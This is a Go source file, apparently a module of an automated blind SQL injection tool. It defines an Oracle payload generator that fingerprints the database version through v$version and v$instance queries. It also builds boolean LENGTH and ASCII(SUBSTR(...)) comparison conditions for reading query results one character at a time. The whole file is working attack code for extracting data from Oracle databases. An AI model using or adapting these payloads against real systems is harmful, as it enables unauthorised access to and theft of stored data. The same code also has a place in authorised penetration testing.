package payloads

import "fmt"

// OraclePayloads implements payloads for Oracle Database
type OraclePayloads struct{}

func (o *OraclePayloads) GetType() DatabaseType {
	return Oracle
}

func (o *OraclePayloads) GetName() string {
	return "Oracle"
}

func (o *OraclePayloads) GetVersionQueries() []string {
	return []string{
		"SELECT banner FROM v$version WHERE ROWNUM=1",
		"SELECT version FROM v$instance",
		"SELECT * FROM v$version WHERE ROWNUM=1",
	}
}

func (o *OraclePayloads) GetLengthPayload(query string, n int) string {
	// LENGTH((query))>n - pure condition
	return fmt.Sprintf("LENGTH((%s))>%d", query, n)
}

func (o *OraclePayloads) GetComparisonPayload(query string, n int) string {
	// (query)>n - pure numeric comparison
	return fmt.Sprintf("(%s)>%d", query, n)
}

func (o *OraclePayloads) GetEqualityPayload(query string, pos int, charCode int) string {
	// ASCII(SUBSTR((query),pos,1))=charCode
	return fmt.Sprintf("ASCII(SUBSTR((%s),%d,1))=%d", query, pos, charCode)
}

func (o *OraclePayloads) GetCharPayload(query string, pos int, n int) string {
	// ASCII(SUBSTR((query),pos,1))>n - pure condition
	// Note: Oracle uses SUBSTR, not SUBSTRING
	return fmt.Sprintf("ASCII(SUBSTR((%s),%d,1))>%d", query, pos, n)
}

func (o *OraclePayloads) GetSubstringFunc() string {
	return "SUBSTR"
}

func (o *OraclePayloads) GetLengthFunc() string {
	return "LENGTH"
}

func (o *OraclePayloads) WrapCondition(condition string) string {
	return condition
}
